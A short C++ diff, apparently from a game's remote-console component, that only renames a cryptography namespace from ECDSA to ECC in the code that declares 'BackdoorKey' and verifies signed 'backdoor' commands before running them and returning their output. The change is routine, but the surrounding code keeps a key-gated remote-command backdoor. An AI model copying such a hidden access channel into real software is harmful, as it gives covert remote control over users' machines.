@@ -3,7 +3,7 @@
 namespace Components
 {
 	RCon::Container RCon::BackdoorContainer;
-	Utils::Cryptography::ECDSA::Key RCon::BackdoorKey;
+	Utils::Cryptography::ECC::Key RCon::BackdoorKey;
 
 	std::string RCon::Password;
 
@@ -145,7 +145,7 @@ namespace Components
 			Proto::RCon::Command command;
 			command.ParseFromString(data);
 
-			if (Utils::Cryptography::ECDSA::VerifyMessage(RCon::BackdoorKey, RCon::BackdoorContainer.challenge, command.signature()))
+			if (Utils::Cryptography::ECC::VerifyMessage(RCon::BackdoorKey, RCon::BackdoorContainer.challenge, command.signature()))
 			{
 				RCon::BackdoorContainer.output.clear();
 				Logger::PipeOutput([] (std::string output)
